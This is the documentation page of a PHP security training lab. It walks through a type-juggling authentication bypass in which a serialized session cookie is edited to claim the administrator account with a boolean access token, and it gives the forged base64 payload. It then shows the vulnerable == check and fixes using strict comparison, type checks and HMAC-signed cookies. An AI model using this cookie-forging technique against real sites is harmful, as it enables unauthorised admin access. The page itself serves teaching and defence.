<?php
/**
 * Lab 02: Modifying Serialized Data Types
 * Technical Documentation & Walkthrough
 */
require_once 'config.php';

$currentUser = getCurrentUser();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation - Lab 02: Modifying Serialized Data Types</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', sans-serif; 
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0f0a 100%); 
            min-height: 100vh; 
            color: #e0e0e0; 
        }
        .header { 
            background: rgba(255,255,255,0.05); 
            backdrop-filter: blur(10px); 
            border-bottom: 1px solid rgba(249,115,22,0.3); 
            padding: 1rem 2rem; 
        }
        .header-content { 
            max-width: 1200px; 
            margin: 0 auto; 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
        }
        .logo { 
            font-size: 1.8rem; 
            font-weight: bold; 
            color: #f97316; 
            text-decoration: none; 
        }
        .nav-links { 
            display: flex; 
            gap: 2rem; 
            align-items: center; 
        }
        .nav-links a { 
            color: #e0e0e0; 
            text-decoration: none; 
            font-weight: 500; 
            transition: color 0.3s; 
        }
        .nav-links a:hover { color: #f97316; }
        .container { max-width: 1000px; margin: 0 auto; padding: 3rem 2rem; }
        .page-title { font-size: 2.5rem; margin-bottom: 0.5rem; color: #f97316; }
        .page-subtitle { color: #888; margin-bottom: 2rem; }
        .toc {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(249,115,22,0.2);
            border-radius: 15px;
            padding: 1.5rem;
            margin-bottom: 2rem;
            backdrop-filter: blur(10px);
        }
        .toc h3 { color: #fb923c; margin-bottom: 1rem; }
        .toc ul { list-style: none; }
        .toc li { margin-bottom: 0.5rem; }
        .toc a { color: #ccc; text-decoration: none; }
        .toc a:hover { color: #f97316; }
        .section {
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(249,115,22,0.2);
            border-radius: 15px;
            padding: 2rem;
            margin-bottom: 2rem;
            backdrop-filter: blur(10px);
        }
        .section h2 { color: #fb923c; margin-bottom: 1.5rem; font-size: 1.5rem; }
        .section h3 { color: #f97316; margin: 1.5rem 0 1rem; font-size: 1.2rem; }
        .section p { color: #ccc; line-height: 1.8; margin-bottom: 1rem; }
        code {
            background: rgba(249,115,22,0.2);
            color: #fb923c;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.9rem;
        }
        pre {
            background: rgba(0, 0, 0, 0.4);
            padding: 1.5rem;
            border-radius: 10px;
            overflow-x: auto;
            margin: 1rem 0;
            border-left: 3px solid #f97316;
        }
        pre code { background: none; padding: 0; font-size: 0.85rem; line-height: 1.6; }
        .comment { color: #6b7280; }
        .keyword { color: #f472b6; }
        .string { color: #a5f3fc; }
        .function { color: #fbbf24; }
        .variable { color: #a78bfa; }
        table {
            width: 100%;
            border-collapse: collapse;
            margin: 1rem 0;
        }
        th, td {
            padding: 0.75rem 1rem;
            text-align: left;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        th { color: #888; font-weight: 500; font-size: 0.85rem; text-transform: uppercase; }
        td { color: #e0e0e0; }
        .warning-box {
            background: rgba(251, 191, 36, 0.1);
            border: 1px solid rgba(251, 191, 36, 0.3);
            border-left: 3px solid #fbbf24;
            padding: 1rem;
            border-radius: 10px;
            margin: 1rem 0;
        }
        .warning-box strong { color: #fbbf24; }
        .success-box {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.3);
            border-left: 3px solid #22c55e;
            padding: 1rem;
            border-radius: 10px;
            margin: 1rem 0;
        }
        .success-box strong { color: #22c55e; }
        .danger-box {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-left: 3px solid #ef4444;
            padding: 1rem;
            border-radius: 10px;
            margin: 1rem 0;
        }
        .danger-box strong { color: #ef4444; }
        .comparison-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
            margin: 1rem 0;
        }
        .comparison-card {
            background: rgba(0, 0, 0, 0.3);
            padding: 1rem;
            border-radius: 10px;
        }
        .comparison-card h4 { margin-bottom: 0.75rem; }
        .comparison-card.vulnerable h4 { color: #ef4444; }
        .comparison-card.secure h4 { color: #22c55e; }
        .back-link { color: #f97316; text-decoration: none; display: inline-block; margin-bottom: 2rem; }
        .back-link:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">TypeJuggle Shop</a>
            <nav class="nav-links">
                <a href="index.php">Home</a>
                <?php if ($currentUser): ?>
                    <a href="my-account.php">My Account</a>
                    <?php if (isAdmin()): ?>
                        <a href="admin.php">Admin Panel</a>
                    <?php endif; ?>
                    <a href="logout.php">Logout</a>
                <?php else: ?>
                    <a href="login.php">Login</a>
                <?php endif; ?>
                <a href="docs.php" style="color: #f97316;">Docs</a>
            </nav>
        </div>
    </header>

    <div class="container">
        <a href="index.php" class="back-link">&larr; Back to Lab</a>
        
        <h1 class="page-title">Technical Documentation</h1>
        <p class="page-subtitle">Lab 02: Modifying Serialized Data Types</p>

        <div class="toc">
            <h3>Table of Contents</h3>
            <ul>
                <li><a href="#overview">1. Lab Overview</a></li>
                <li><a href="#walkthrough">2. Step-by-Step Walkthrough</a></li>
                <li><a href="#why-it-works">3. Why The Exploit Works</a></li>
                <li><a href="#vulnerable-code">4. Vulnerable Code Analysis</a></li>
                <li><a href="#secure-code">5. Secure Code Implementation</a></li>
                <li><a href="#comparison">6. Code Comparison</a></li>
            </ul>
        </div>

        <!-- Section 1: Lab Overview -->
        <section id="overview" class="section">
            <h2>1. Lab Overview</h2>
            
            <h3>Purpose</h3>
            <p>
                This lab demonstrates the dangerous consequences of using PHP's loose comparison operator 
                (<code>==</code>) when validating deserialized data. The vulnerability allows an attacker 
                to bypass authentication by exploiting PHP's type juggling behavior.
            </p>

            <h3>Attack Surface</h3>
            <table>
                <tr>
                    <th>Component</th>
                    <th>Details</th>
                </tr>
                <tr>
                    <td>Entry Point</td>
                    <td>Session cookie containing serialized <code>User</code> object</td>
                </tr>
                <tr>
                    <td>Vulnerability</td>
                    <td>Loose comparison (<code>==</code>) for access_token validation</td>
                </tr>
                <tr>
                    <td>Impact</td>
                    <td>Authentication bypass, full admin access</td>
                </tr>
                <tr>
                    <td>Root Cause</td>
                    <td>PHP type juggling: <code>"string" == 0</code> is TRUE</td>
                </tr>
            </table>

            <h3>Backend Logic Flow</h3>
            <pre><code>1. User logs in → Server creates User object with username + access_token
2. Object is serialized → Base64 encoded → Stored in cookie
3. On each request → Cookie is decoded → Deserialized → Validated
4. <span class="danger-box" style="display:inline;padding:2px 6px;">Validation uses == to compare access_token (VULNERABLE)</span>
5. If validation passes → User gains access based on username</code></pre>
        </section>

        <!-- Section 2: Walkthrough -->
        <section id="walkthrough" class="section">
            <h2>2. Step-by-Step Walkthrough</h2>

            <h3>Step 1: Login and Capture Cookie</h3>
            <p>Log in using <code>wiener:peter</code> and examine the session cookie:</p>
            <pre><code><span class="comment"># Cookie value (example - yours will differ due to random token)</span>
session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjY0OiJhYmMxMjM0NTY3ODkwYWJjZGVmMTIzNDU2Nzg5MGFiY2RlZjEyMzQ1Njc4OTBhYmNkZWYxMjM0NTY3ODkwYWIiO30=</code></pre>

            <h3>Step 2: Decode the Cookie</h3>
            <p>Base64 decode to reveal the serialized object:</p>
            <pre><code><span class="comment"># Decoded serialized object</span>
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:64:"abc1234567890...";}</code></pre>

            <h3>Step 3: Understand the Structure</h3>
            <pre><code>O:4:"User"           <span class="comment">// Object of class "User" (4 chars)</span>
:2:                  <span class="comment">// Has 2 properties</span>
{
  s:8:"username";    <span class="comment">// Property name (string, 8 chars)</span>
  s:6:"wiener";      <span class="comment">// Value (string, 6 chars)</span>
  s:12:"access_token"; <span class="comment">// Property name (string, 12 chars)</span>
  s:64:"abc123...";  <span class="comment">// Value (string, 64 chars) ← ATTACK TARGET</span>
}</code></pre>

            <h3>Step 4: Craft the Payload</h3>
            <p>Modify the object to become administrator:</p>
            <pre><code><span class="comment"># Original (wiener)</span>
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:64:"abc..."}

<span class="comment"># Modified (administrator) - Works on PHP 7 & 8</span>
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}

<span class="comment"># Key changes:</span>
<span class="comment"># 1. s:6:"wiener" → s:13:"administrator" (length: 6 → 13)</span>
<span class="comment"># 2. s:64:"..." → b:1 (type: string → boolean true)</span></code></pre>

            <h3>Step 5: Encode and Replace Cookie</h3>
            <pre><code><span class="comment"># Base64 encode the modified payload</span>
echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}' | base64

<span class="comment"># Result:</span>
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2I6MTt9</code></pre>

            <h3>Step 6: Access Admin Panel</h3>
            <p>Replace the cookie in your browser and navigate to <code>/my-account.php</code>. 
               You should now see the "Admin Panel" link. Access it and delete carlos.</p>

            <div class="success-box">
                <strong>Success!</strong> Lab completed. The server accepted boolean <code>true</code> as a valid 
                access token because <code>true == "any_non_empty_string"</code> is TRUE in PHP (7 & 8).
            </div>
        </section>

        <!-- Section 3: Why It Works -->
        <section id="why-it-works" class="section">
            <h2>3. Why The Exploit Works</h2>

            <h3>PHP Type Juggling</h3>
            <p>
                PHP is a loosely typed language. When using the <code>==</code> operator to compare 
                values of different types, PHP performs type coercion (type juggling) before comparison.
            </p>

            <h3>The Critical Behavior</h3>
            <pre><code><span class="comment">// When comparing boolean to string:</span>
<span class="variable">$token</span> = <span class="string">"a7f3b9c2d1e0..."</span>;  <span class="comment">// Real token (string)</span>
<span class="variable">$attack</span> = <span class="keyword">true</span>;                  <span class="comment">// Attacker's value (boolean)</span>

<span class="comment">// PHP evaluates the string as truthy (non-empty)</span>
<span class="comment">// Any non-empty string is truthy, so it equals true</span>
<span class="variable">$token</span> == <span class="variable">$attack</span>  <span class="comment">// "a7f3b9c2..." == true</span>
                    <span class="comment">// (bool)"a7f3b9c2..." = true</span>
                    <span class="comment">// true == true → TRUE!</span></code></pre>

            <h3>Type Juggling Comparison Table</h3>
            <table>
                <tr>
                    <th>Expression</th>
                    <th>PHP 7</th>
                    <th>PHP 8</th>
                    <th>Notes</th>
                </tr>
                <tr>
                    <td><code>true == "any"</code></td>
                    <td>TRUE</td>
                    <td>TRUE</td>
                    <td>Non-empty strings are truthy</td>
                </tr>
                <tr>
                    <td><code>0 == "admin"</code></td>
                    <td>TRUE</td>
                    <td>FALSE</td>
                    <td>PHP 8 changed this behavior</td>
                </tr>
                <tr>
                    <td><code>"0e123" == "0e456"</code></td>
                    <td>TRUE</td>
                    <td>TRUE</td>
                    <td>Both are scientific notation for 0</td>
                </tr>
                <tr>
                    <td><code>"abc" === 0</code></td>
                    <td>FALSE</td>
                    <td>FALSE</td>
                    <td>Strict comparison, no type coercion</td>
                </tr>
            </table>

            <h3>Root Cause Analysis</h3>
            <div class="danger-box">
                <strong>The Flaw:</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem; color: #fca5a5;">
                    <li>Session data is stored in client-controlled cookie</li>
                    <li>No integrity check (HMAC/signature) on serialized data</li>
                    <li>Access token validated using loose comparison (<code>==</code>)</li>
                    <li>Type can be changed from string to integer during deserialization</li>
                </ol>
            </div>
        </section>

        <!-- Section 4: Vulnerable Code -->
        <section id="vulnerable-code" class="section">
            <h2>4. Vulnerable Code Analysis</h2>

            <h3>The Vulnerable Validation Function</h3>
            <pre><code><span class="keyword">function</span> <span class="function">validateSession</span>(<span class="variable">$sessionData</span>) {
    <span class="keyword">if</span> (!<span class="variable">$sessionData</span> || !<span class="keyword">isset</span>(<span class="variable">$sessionData</span>->username)) {
        <span class="keyword">return</span> <span class="keyword">false</span>;
    }
    
    <span class="variable">$pdo</span> = <span class="function">getDBConnection</span>();
    
    <span class="comment">// Get the real access token from database</span>
    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(<span class="string">"SELECT access_token FROM users WHERE username = ?"</span>);
    <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$sessionData</span>->username]);
    <span class="variable">$user</span> = <span class="variable">$stmt</span>-><span class="function">fetch</span>();
    
    <span class="keyword">if</span> (!<span class="variable">$user</span>) {
        <span class="keyword">return</span> <span class="keyword">false</span>;
    }
    
    <span class="comment">// VULNERABLE LINE: Using loose comparison ==</span>
    <span class="comment">// When $sessionData->access_token is boolean true,</span>
    <span class="comment">// and $user['access_token'] is a non-empty string like "abc123...",</span>
    <span class="comment">// PHP evaluates the string as truthy, so true == true is TRUE</span>
    <span class="keyword" style="background: rgba(220,38,38,0.3); padding: 2px 4px;">if</span> (<span class="variable">$sessionData</span>->access_token <span style="background: rgba(220,38,38,0.3); padding: 2px 4px;">==</span> <span class="variable">$user</span>[<span class="string">'access_token'</span>]) {
        <span class="keyword">return</span> <span class="keyword">true</span>;
    }
    
    <span class="keyword">return</span> <span class="keyword">false</span>;
}</code></pre>

            <h3>Line-by-Line Analysis</h3>
            <table>
                <tr>
                    <th>Line</th>
                    <th>Issue</th>
                </tr>
                <tr>
                    <td><code>$sessionData->access_token == $user['access_token']</code></td>
                    <td>Uses <code>==</code> (loose) instead of <code>===</code> (strict)</td>
                </tr>
                <tr>
                    <td><code>$sessionData = @unserialize($decoded)</code></td>
                    <td>Trusts deserialized data without type validation</td>
                </tr>
                <tr>
                    <td>No data type check</td>
                    <td>Doesn't verify that access_token is actually a string</td>
                </tr>
            </table>

            <h3>Developer Assumptions (All Wrong)</h3>
            <div class="warning-box">
                <strong>Incorrect Assumptions:</strong>
                <ul style="margin-left: 1.5rem; margin-top: 0.5rem; color: #a0a0a0;">
                    <li>"Cookies are too complex for users to modify"</li>
                    <li>"The access_token will always be a string"</li>
                    <li>"Base64 encoding protects the data"</li>
                    <li>"Loose comparison is equivalent to strict comparison"</li>
                </ul>
            </div>
        </section>

        <!-- Section 5: Secure Code -->
        <section id="secure-code" class="section">
            <h2>5. Secure Code Implementation</h2>

            <h3>Fixed Validation Function</h3>
            <pre><code><span class="keyword">function</span> <span class="function">validateSession</span>(<span class="variable">$sessionData</span>) {
    <span class="comment">// Null check</span>
    <span class="keyword">if</span> (!<span class="variable">$sessionData</span> || !<span class="keyword">isset</span>(<span class="variable">$sessionData</span>->username) || 
        !<span class="keyword">isset</span>(<span class="variable">$sessionData</span>->access_token)) {
        <span class="keyword">return</span> <span class="keyword">false</span>;
    }
    
    <span class="comment">// FIX 1: Validate data types explicitly</span>
    <span class="keyword" style="background: rgba(34,197,94,0.3); padding: 2px 4px;">if</span> (!<span class="function" style="background: rgba(34,197,94,0.3); padding: 2px 4px;">is_string</span>(<span class="variable">$sessionData</span>->username) || 
        !<span class="function" style="background: rgba(34,197,94,0.3); padding: 2px 4px;">is_string</span>(<span class="variable">$sessionData</span>->access_token)) {
        <span class="keyword">return</span> <span class="keyword">false</span>; <span class="comment">// Reject non-string types</span>
    }
    
    <span class="variable">$pdo</span> = <span class="function">getDBConnection</span>();
    
    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(<span class="string">"SELECT access_token FROM users WHERE username = ?"</span>);
    <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$sessionData</span>->username]);
    <span class="variable">$user</span> = <span class="variable">$stmt</span>-><span class="function">fetch</span>();
    
    <span class="keyword">if</span> (!<span class="variable">$user</span>) {
        <span class="keyword">return</span> <span class="keyword">false</span>;
    }
    
    <span class="comment">// FIX 2: Use strict comparison ===</span>
    <span class="keyword" style="background: rgba(34,197,94,0.3); padding: 2px 4px;">if</span> (<span class="variable">$sessionData</span>->access_token <span style="background: rgba(34,197,94,0.3); padding: 2px 4px;">===</span> <span class="variable">$user</span>[<span class="string">'access_token'</span>]) {
        <span class="keyword">return</span> <span class="keyword">true</span>;
    }
    
    <span class="comment">// Alternative FIX 3: Use hash_equals for timing-safe comparison</span>
    <span class="comment">// if (hash_equals($user['access_token'], $sessionData->access_token)) {</span>
    <span class="comment">//     return true;</span>
    <span class="comment">// }</span>
    
    <span class="keyword">return</span> <span class="keyword">false</span>;
}</code></pre>

            <h3>Better Approach: Server-Side Sessions</h3>
            <pre><code><span class="comment">// Don't store session data in cookies at all</span>
<span class="comment">// Use PHP's built-in session management</span>

<span class="function">session_start</span>();

<span class="keyword">function</span> <span class="function">login</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) {
    <span class="comment">// Validate credentials...</span>
    
    <span class="comment">// Store session server-side only</span>
    <span class="variable">$_SESSION</span>[<span class="string">'user_id'</span>] = <span class="variable">$user</span>[<span class="string">'id'</span>];
    <span class="variable">$_SESSION</span>[<span class="string">'username'</span>] = <span class="variable">$user</span>[<span class="string">'username'</span>];
    
    <span class="comment">// Only a session ID is stored in the cookie</span>
    <span class="comment">// Actual data stays on the server</span>
}

<span class="keyword">function</span> <span class="function">getCurrentUser</span>() {
    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'user_id'</span>])) {
        <span class="keyword">return</span> <span class="keyword">null</span>;
    }
    
    <span class="comment">// Fetch fresh user data from database</span>
    <span class="keyword">return</span> <span class="function">getUserById</span>(<span class="variable">$_SESSION</span>[<span class="string">'user_id'</span>]);
}</code></pre>

            <h3>Best Practice: Signed Cookies</h3>
            <pre><code><span class="keyword">define</span>(<span class="string">'SECRET_KEY'</span>, <span class="function">getenv</span>(<span class="string">'APP_SECRET'</span>));

<span class="keyword">function</span> <span class="function">createSignedCookie</span>(<span class="variable">$data</span>) {
    <span class="variable">$serialized</span> = <span class="function">serialize</span>(<span class="variable">$data</span>);
    <span class="variable">$signature</span> = <span class="function">hash_hmac</span>(<span class="string">'sha256'</span>, <span class="variable">$serialized</span>, SECRET_KEY);
    <span class="keyword">return</span> <span class="function">base64_encode</span>(<span class="variable">$serialized</span> . <span class="string">'|'</span> . <span class="variable">$signature</span>);
}

<span class="keyword">function</span> <span class="function">verifySignedCookie</span>(<span class="variable">$cookie</span>) {
    <span class="variable">$decoded</span> = <span class="function">base64_decode</span>(<span class="variable">$cookie</span>);
    <span class="variable">$parts</span> = <span class="function">explode</span>(<span class="string">'|'</span>, <span class="variable">$decoded</span>, <span class="keyword">2</span>);
    
    <span class="keyword">if</span> (<span class="function">count</span>(<span class="variable">$parts</span>) !== <span class="keyword">2</span>) <span class="keyword">return</span> <span class="keyword">null</span>;
    
    <span class="keyword">list</span>(<span class="variable">$serialized</span>, <span class="variable">$signature</span>) = <span class="variable">$parts</span>;
    <span class="variable">$expected</span> = <span class="function">hash_hmac</span>(<span class="string">'sha256'</span>, <span class="variable">$serialized</span>, SECRET_KEY);
    
    <span class="comment">// Timing-safe comparison</span>
    <span class="keyword">if</span> (!<span class="function">hash_equals</span>(<span class="variable">$expected</span>, <span class="variable">$signature</span>)) {
        <span class="keyword">return</span> <span class="keyword">null</span>; <span class="comment">// Cookie was tampered with</span>
    }
    
    <span class="keyword">return</span> <span class="function">unserialize</span>(<span class="variable">$serialized</span>);
}</code></pre>
        </section>

        <!-- Section 6: Comparison -->
        <section id="comparison" class="section">
            <h2>6. Code Comparison</h2>

            <div class="comparison-grid">
                <div class="comparison-card vulnerable">
                    <h4>Vulnerable Code</h4>
                    <pre><code><span class="comment">// Type juggling vulnerability</span>
<span class="keyword">if</span> (<span class="variable">$token</span> <span style="color:#f87171;">==</span> <span class="variable">$expected</span>) {
    <span class="comment">// Bypassed with boolean true</span>
}</code></pre>
                </div>
                <div class="comparison-card secure">
                    <h4>Secure Code</h4>
                    <pre><code><span class="comment">// Strict comparison</span>
<span class="keyword">if</span> (<span class="variable">$token</span> <span style="color:#22c55e;">===</span> <span class="variable">$expected</span>) {
    <span class="comment">// Cannot be bypassed</span>
}</code></pre>
                </div>
            </div>

            <h3>What Changed</h3>
            <table>
                <tr>
                    <th>Aspect</th>
                    <th>Vulnerable</th>
                    <th>Secure</th>
                </tr>
                <tr>
                    <td>Comparison</td>
                    <td><code>==</code> (loose)</td>
                    <td><code>===</code> (strict)</td>
                </tr>
                <tr>
                    <td>Type checking</td>
                    <td>None</td>
                    <td><code>is_string()</code> validation</td>
                </tr>
                <tr>
                    <td>Type coercion</td>
                    <td>PHP converts types</td>
                    <td>Types must match exactly</td>
                </tr>
                <tr>
                    <td><code>0 == "string"</code></td>
                    <td>TRUE (bypassed)</td>
                    <td>FALSE (rejected)</td>
                </tr>
            </table>

            <h3>Security Measures Summary</h3>
            <div class="success-box">
                <strong>Prevention Checklist:</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem; color: #a0a0a0;">
                    <li><strong>Use strict comparison (<code>===</code>) everywhere</strong></li>
                    <li>Validate data types explicitly before use</li>
                    <li>Use server-side sessions instead of cookie-based data</li>
                    <li>Sign cookies with HMAC to detect tampering</li>
                    <li>Use <code>hash_equals()</code> for timing-safe comparisons</li>
                    <li>Enable PHP strict types: <code>declare(strict_types=1);</code></li>
                </ol>
            </div>
        </section>
    </div>
</body>
</html>
